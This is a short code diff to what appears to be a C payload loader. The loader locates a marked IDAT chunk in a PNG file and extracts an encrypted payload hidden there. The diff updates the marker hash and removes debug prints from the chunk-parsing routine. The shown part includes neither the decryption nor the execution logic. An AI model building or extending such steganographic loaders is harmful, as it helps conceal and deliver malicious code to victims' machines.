@@ -19,7 +19,7 @@
 // TO UPDATE with respect to every new created PNG:
 //
 //
-#define MARKED_IDAT_HASH	   0xB1973AC4
+#define MARKED_IDAT_HASH	   0xF95A404E
 
 // ---------------------------------------------------------------------------------------------------------------------------------------------
 // ---------------------------------------------------------------------------------------------------------------------------------------------
@@ -125,11 +125,6 @@ BOOL ExtractDecryptedPayload(IN PBYTE pPngFileBuffer, IN SIZE_T sPngFileSize, OU
 		// Fetch CRC32 hash
 		uCRC32Hash = (pPngFileBuffer[Offset] << 24) | (pPngFileBuffer[Offset + 1] << 16) | (pPngFileBuffer[Offset + 2] << 8) | pPngFileBuffer[Offset + 3];
 		Offset += sizeof(UINT32);
-
-		printf("[i] Section: %s \n", (CHAR*)pSectionType);
-		printf("\t> Buffer: 0x%p \n", pSectionBuffer);
-		printf("\t> Length: %d \n", (int)uSectionLength);
-		printf("\t> Hash: 0x%0.8X \n", uCRC32Hash);
 
 		// End of the png file  
 		if (uCRC32Hash == IEND_HASH)
